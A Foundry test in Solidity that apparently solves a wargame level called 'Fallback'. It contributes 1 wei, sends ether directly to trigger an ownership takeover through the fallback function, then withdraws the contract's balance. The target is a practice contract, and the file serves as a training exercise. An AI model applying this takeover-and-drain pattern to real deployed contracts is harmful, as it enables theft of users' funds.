// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";
import {FallbackFactory} from "../src/Fallback/FallbackFactory.sol";

contract FallbackTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testFallback() public {
        FallbackFactory factory = new FallbackFactory();
        address instance = factory.createInstance(_alice); // _alice is nothing to do with this
        assertEq(factory.owner(), address(this));
        Fallback f = Fallback(payable(instance));
        assertEq(f.owner(), address(factory));
        vm.startPrank(_alice);
        f.contribute{value: 1 wei}();
        (bool _success, ) = payable(instance).call{value: 1 wei}("");
        _success;
        f.withdraw();
        assertTrue(
            factory.validateInstance(payable(instance), _alice),
            "invalid"
        );
    }
}
